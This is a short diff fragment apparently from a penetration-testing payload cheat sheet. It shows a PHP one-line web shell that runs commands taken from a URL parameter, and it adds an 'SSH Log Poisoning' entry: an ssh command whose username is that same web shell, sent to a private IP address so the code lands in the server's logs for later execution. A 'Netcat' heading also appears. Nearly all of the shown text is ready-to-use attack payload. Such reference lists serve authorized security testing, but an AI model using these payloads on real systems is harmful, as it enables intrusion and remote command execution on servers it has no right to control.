@@ -13,6 +13,12 @@
   ```php
   <?php system($_GET['cmd']);?>
   ```
+  
+* Web Shell (SSH Log Poisoning)
+
+  ```php
+  ssh '<?php system($_GET['c']); ?>'@192.168.1.2
+  ```
 
 * Netcat
 
